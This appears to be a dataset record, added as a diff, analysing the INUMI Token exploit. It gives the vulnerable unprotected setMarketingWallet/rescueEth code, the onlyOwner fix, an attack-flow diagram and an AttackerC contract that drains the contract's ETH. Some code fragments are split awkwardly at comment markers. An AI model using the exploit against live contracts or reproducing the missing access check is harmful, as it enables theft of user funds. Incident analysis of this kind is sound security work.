@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-09-13_INUMI_AccessControlDrain",
+ "source_file": "2024/2024-09-13_INUMI_AccessControlDrain.md",
+ "title": "INUMI Token — setMarketingWallet + rescueEth Missing Access Control Analysis",
+ "date": "2024-09-13",
+ "protocol": "INUMI Token",
+ "chain": "Ethereum",
+ "loss_raw": "~11,000 USD",
+ "loss_usd": null,
+ "root_cause": "No access control on setMarketingWallet() — any arbitrary address can set the marketing wallet and call rescueEth()",
+ "attack_tx": "0xbeef352f716973043236f73dd5104b9d905fd04b7fc58d9958ac5462e7e3dbc1",
+ "vulnerable_contract": "0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: no access control on setMarketingWallet\nfunction setMarketingWallet(address walletAddress) external {\n    //",
+  "❌ No onlyOwner — anyone can change the marketing wallet\n    marketingWallet = walletAddress;\n}\n\nfunction rescueEth() external {\n    // Sends ETH to the marketing wallet — redirected to attacker-specified address\n    uint256 balance = address(this).balance;\n    payable(marketingWallet).transfer(balance);  //",
+  "❌ Transfers to attacker's address\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: add onlyOwner access control\nfunction setMarketingWallet(address walletAddress) external onlyOwner {  //",
+  "✅ Access control\n    require(walletAddress != address(0), \"Zero address\");\n    marketingWallet = walletAddress;\n    emit MarketingWalletUpdated(walletAddress);\n}"
+ ],
+ "steps": [
+  "► No access control → marketingWallet = 0xd129D8...",
+  "► ETH → 0xd129D8... (AttackerC)",
+  "[4] ► AttackerC → forward ETH to attacker (0xd215ff...)"
+ ],
+ "other_code": [
+  "Attacker (0xd215ff...)\n  │\n  ├─[1]─► Deploy AttackerC contract (0xd129D8...)\n  │\n  ├─[2]─► Call ITarget(0xdb27D4...).setMarketingWallet(address(AttackerC))\n  │         └─► No access control → marketingWallet = 0xd129D8...\n  │\n  ├─[3]─► Call ITarget(0xdb27D4...).rescueEth()\n  │         └─► balance = address(this).balance (~5 ETH)\n  │               └─► payable(marketingWallet).transfer(balance)\n  │                     └─► ETH → 0xd129D8... (AttackerC)\n  │\n  ├─[4]─► AttackerC → forward ETH to attacker (0xd215ff...)\n  │\n  └─[5]─► Total loss: ~11,000 USD",
+  "interface ITarget {\n    function setMarketingWallet(address walletAddress) external;\n    function rescueEth() external;\n}\n\n// 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD\ncontract AttackerC {\n    function attack() public payable {\n        // [2] Set marketing wallet to attack contract (exploiting missing access control)\n        ITarget(addr1).setMarketingWallet(address(this));\n\n        // [3] rescueEth: transfers contract ETH to marketingWallet (attacker)\n        ITarget(addr1).rescueEth();\n\n        // [4] Forward drained ETH to attacker EOA\n        (bool s, ) = attacker.call{value: address(this).balance}(\"\");\n    }\n\n    fallback() external payable {}\n    receive() external payable {}\n}"
+ ]
+}
